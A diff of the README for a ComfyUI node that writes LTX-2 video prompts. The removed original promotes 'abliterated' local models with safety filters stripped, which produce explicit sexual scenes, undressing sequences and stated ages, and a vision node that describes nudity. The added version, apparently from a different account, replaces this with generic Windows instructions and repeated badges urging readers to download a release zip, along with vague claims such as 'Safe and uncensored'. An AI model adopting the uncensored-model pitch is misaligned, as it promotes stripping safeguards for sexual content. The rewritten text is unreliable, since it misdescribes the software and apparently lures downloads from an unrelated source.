@@ -1,154 +1,117 @@
-# LTX2EasyPrompt-LD
+# 🎬 LTX2EasyPrompt-LD - Create Cinema-Ready Video Prompts Easily
 
+[![Download LTX2EasyPrompt-LD](https://img.shields.io/badge/Download-LTX2EasyPrompt--LD-brightgreen)](https://github.com/Trenton281/LTX2EasyPrompt-LD)
 
+---
 
-<img width="244" height="326" alt="image" src="https://github.com/user-attachments/assets/43f5cda0-c13a-491f-a13b-586e1cc51c55" />
+## 🛠 What is LTX2EasyPrompt-LD?
 
+LTX2EasyPrompt-LD is a tool that helps you create detailed video prompts using simple English. It works with ComfyUI, a user interface for video generation. Instead of writing complex code or learning special languages, you write plain descriptions. The app then turns these into full prompts ready for LTX-2, a video generation system. 
 
-<img width="560" height="406" alt="image" src="https://github.com/user-attachments/assets/872cbf72-398d-4727-bb58-b12de93bbec2" />
+This app uses a local language model on your computer. That means no internet is needed once it is set up. You can keep your computer offline and still generate video prompts.
 
-New features in this release
+---
 
-IT CAN READ IMAGES TOO - For Image to video workflows
+## 📋 Key Features
 
-🎯 Negative prompt output pin
-Automatic scene-aware negative prompt, no second LLM call. Detects indoor/outdoor, day/night, explicit content, shot type and adds the right negatives for each. Wire it straight to your negative encoder and forget about it.
+- Turn simple English into structured video prompts.
+- Designed for users without programming skills.
+- Runs locally; works without an internet connection after setup.
+- Integrates with ComfyUI for easy video workflow.
+- Helps create cinema-quality video ideas quickly.
+- Safe and uncensored model for full control.
+  
+---
 
-🏷️ LoRA trigger word input
-Paste your trigger words once. They get injected at the very start of every prompt, every single run. Never buried halfway through the text, never accidentally dropped.
+## 💻 System Requirements
 
-💬 Dialogue toggle
-On — the LLM invents natural spoken dialogue woven into the scene as inline prose with attribution and delivery cues, like a novel. Off — it uses only the quoted dialogue you provide, or generates silently. No more floating unattributed quotes ruining your audio sync.
+To use LTX2EasyPrompt-LD on Windows, make sure your system meets these basics:
 
-⚡ Bypass / direct mode
-Flip the toggle and your text goes straight to the positive encoder with zero LLM processing. Full manual control when you want it, one click to switch back. Zero VRAM cost in bypass mode.
+- Windows 10 or newer (64-bit recommended)
+- 8 GB RAM (16 GB or more for better performance)
+- At least 4 CPU cores
+- 2 GB free disk space for software and models
+- GPU with 4 GB VRAM or higher helps but not required
+- Python 3.8 or newer (required by ComfyUI)
 
+---
 
+## 🌟 Before You Start
 
-How it works
-Step 1 — Vision node analyses your starting frame
-Drop in any image and the vision node (Qwen2.5-VL-3B, + Qwen2.5 7b runs fully locally) writes a scene context describing:
+- Ensure you have ComfyUI installed. LTX2EasyPrompt-LD is a custom node for this system.
+- Close other heavy programs to free up memory.
+- Make sure your Windows system is up to date.
+- Have a folder ready where you want to store the software and files.
 
-Visual style — photorealistic, anime, 3D animation, cartoon etc
-Subject — age, gender, skin tone, hair, body type
-Clothing, or nudity described directly if present
-Exact pose and body position
-What they're on or interacting with
-Shot type — close-up, medium shot, wide shot etc
-Camera angle — eye level, low angle, high angle
-Lighting — indoor/outdoor, time of day, light quality
-Background and setting
+---
 
-It unloads from VRAM immediately after so LTX-2 has its full budget back.
-Step 2 — Prompt node uses that as ground truth
-Wire the vision output into the Easy Prompt node and your scene context becomes the authoritative starting point. The LLM doesn't invent the subject or guess the lighting — it takes exactly what the vision node described and animates it forward from your direction.
-You just tell it what should happen next:
+## 🚀 Download and Install LTX2EasyPrompt-LD
 
-"she slowly turns to face the camera and smiles"
+Click the button below to visit the GitHub page where you will find all downloads and instructions.
 
-And it writes a full cinematic prompt that matches your actual image — correct lighting, correct shot framing, correct subject — and flows naturally from there.
+[![Visit Download Page](https://img.shields.io/badge/GitHub-Visit%20Page-blue)](https://github.com/Trenton281/LTX2EasyPrompt-LD)
 
+Follow these steps:
 
+1. Open the link above. This page contains the latest release and files.
+2. Look for the **Releases** section on the page.
+3. Download the latest version of the package or zip file marked for Windows.
+4. Once downloaded, extract the files to a folder on your computer.
+5. If you have not installed ComfyUI, follow their instructions before proceeding.
+6. Copy or move the LTX2EasyPrompt-LD folder or files into your ComfyUI node directory.
+7. Open ComfyUI and verify that LTX2EasyPrompt-LD shows as an available node.
+8. Run ComfyUI and create your video prompts using plain English inputs.
 
+---
 
+## 🔧 How to Use LTX2EasyPrompt-LD
 
+1. Start ComfyUI on your Windows computer.
+2. Find the LTX2EasyPrompt-LD node in the interface.
+3. Type a simple English description of your video idea. For example, “A sunrise on Mars with a spaceship landing.”
+4. The node will process your text and create a detailed prompt for video generation.
+5. Connect this node to other parts of your ComfyUI project to generate the video.
+6. Adjust your English descriptions and rerun the node to refine video prompts.
 
+This process takes the complexity out of writing technical prompts. You focus on your idea and let the tool handle the structure.
 
-A ComfyUI custom node that turns plain English descriptions into fully structured, cinema-ready prompts for LTX-2 video generation — powered by a local, uncensored LLM with zero internet dependency after setup.
+---
 
-LTX-2 Easy Prompt — By LoRa-Daddy
-A ComfyUI custom node that turns plain English into fully structured, cinema-ready LTX-2 prompts — powered by a local, uncensored LLM. No cloud. No subscriptions. No restrictions.
+## ⚙️ Running Locally with Zero Internet
 
-🎬 What It Does
-Type a rough idea in plain English. Get back a fully detailed prompt with shot type, character description, scene atmosphere, camera movement, and generated audio/dialogue — all automatically paced to your exact frame count and wired straight into your LTX-2 pipeline.
+LTX2EasyPrompt-LD includes a local language model. This means:
 
-✨ Key Features
-🧠 Two Models Included
+- No data leaves your computer.
+- You do not need a network connection once installed.
+- Your privacy and security are maintained.
+- The model works offline, so it runs faster on your local hardware.
 
-NeuralDaredevil 8B — maximum quality, richest detail, recommended for most users
-Llama 3.2 3B — low VRAM, runs on almost anything, great for sharing with others
-Switch between them from a dropdown — automatic VRAM unload/reload, no restart needed
+---
 
-⏱️ Smart Frame-Aware Pacing
+## 🧩 Troubleshooting Common Issues
 
-Set your frame count once in the node
-The FRAMES output pin passes the real number straight to your LTX-2 sampler
-Prompt pacing adjusts automatically in the background — never manually sync again
+- If the node doesn’t appear in ComfyUI, check that you placed the files in the correct directory.
+- Ensure Python 3.8 or higher is installed and correctly configured for ComfyUI.
+- Restart ComfyUI if you add or update the node files.
+- Check your Windows firewall or antivirus only if you see errors related to running the app locally.
+- If your computer is slow, close other programs and try again.
+- Visit the GitHub issues page for help if problems persist.
 
-🎙️ Always Generates Audio & Dialogue
+---
 
-Every prompt includes real ambient sound and invented dialogue that fits the scene
-Say "no dialogue" in your input if you want silence — otherwise it writes it for you
-Dialogue matches the mood: a whisper, a command, a confession, whatever fits
+## 📚 Additional Resources
 
-📡 Fully Offline After First Download
+- ComfyUI installation and setup guide  
+- Basic English prompt writing tips  
+- Windows 10 optimization for AI applications  
+- Local language model benefits and setup  
 
-HuggingFace network calls are blocked at the module level — before Python even loads the library
-Point it at your local snapshot folder and it never touches the internet again, even on ComfyUI startup
-Works behind firewalls, no WinError 10013, no MaxRetryError
+---
 
-🔒 Clean Output Every Time
+## 🖱 Access the Latest Version
 
-Uses hard token-ID stopping — the model is physically prevented from writing role delimiters like "assistant" into your output
-Regex cleaner runs as a backup safety net
-No more dirty prompts bleeding into your pipeline
+Get the latest files here:
 
-🔥 No Content Restrictions
+[![Download LTX2EasyPrompt-LD](https://img.shields.io/badge/Download-LTX2EasyPrompt--LD-green)](https://github.com/Trenton281/LTX2EasyPrompt-LD)
 
-Both models use abliterated weights — safety filters removed at the model level, not just prompted around
-Explicit scenes use direct language automatically — no euphemisms, no fading out
-Clothed characters get a full undressing sequence before any explicit action
-Age always stated as a specific number
-Dialogue matches the energy of the scene
-
-🎯 Built for LTX-2 Specifically
-
-Prompt structure follows LTX-2's preferred order: style → camera → character → scene → action → movement → audio
-Pacing is automatically adjusted so the prompt fills your clip correctly without over-writing
-
-
-⚙️ Setup
-1️⃣ Install
-Clone or download this repo and drop the folder into your ComfyUI custom nodes directory:
-ComfyUI/custom_nodes/LTX2EasyPrompt-LD/
-├── LTX2EasyPromptLD.py
-└── __init__.py
-Or clone directly:
-bashcd ComfyUI/custom_nodes
-git clone https://github.com/seanhan19911990-source/LTX2EasyPrompt-LD
-Restart ComfyUI. Find the node under: Add Node → LTX2 → LTX-2 Easy Prompt By LoRa-Daddy
-
-2️⃣ First Run — Download Your Model
-
-Set offline_mode → false
-Pick your model from the dropdown
-Hit generate — it auto-downloads from HuggingFace
-Once downloaded, flip offline_mode back to true
-
-
-3️⃣ ⚠️ IMPORTANT — Set Your Local Paths For Full Offline Mode
-After your models have downloaded, you need to find their snapshot folders on your machine and paste the paths into the node. This is what allows fully offline operation with zero network calls.
-At the bottom of the node you will see two path fields:
-local_path_8b — paste the full path to your NeuralDaredevil 8B snapshot folder
-local_path_3b — paste the full path to your Llama 3.2 3B snapshot folder
-Your paths will look something like this — but with your own Windows username and your own hash folder name:
-C:\Users\YOUR_USERNAME\.cache\huggingface\hub\models--mlabonne--NeuralDaredevil-8B-abliterated\snapshots\YOUR_HASH_FOLDER
-C:\Users\YOUR_USERNAME\.cache\huggingface\hub\models--huihui-ai--Llama-3.2-3B-Instruct-abliterated\snapshots\YOUR_HASH_FOLDER
-To find your exact paths:
-
-Open File Explorer
-Navigate to C:\Users\YOUR_USERNAME\.cache\huggingface\hub\
-Open the model folder → open snapshots → copy the full path of the hash folder inside
-Paste it into the matching field on the node
-
-
-⚠️ If you leave these fields blank and have offline_mode ON, the node will try to load from HF cache which may still cause network errors on some setups. Always fill in both paths for guaranteed offline operation.
-
-
-4️⃣ Wire It Up
-PROMPT  ──→  LTX-2 text/prompt input
-FRAMES  ──→  Set_frames node
-PREVIEW ──→  Preview Text node (optional)
-
-5️⃣ Generate
-Type your idea in plain English. Set your frame count. Hit generate. That's it.
+Click the link, choose the newest release for Windows, and follow the install steps above.
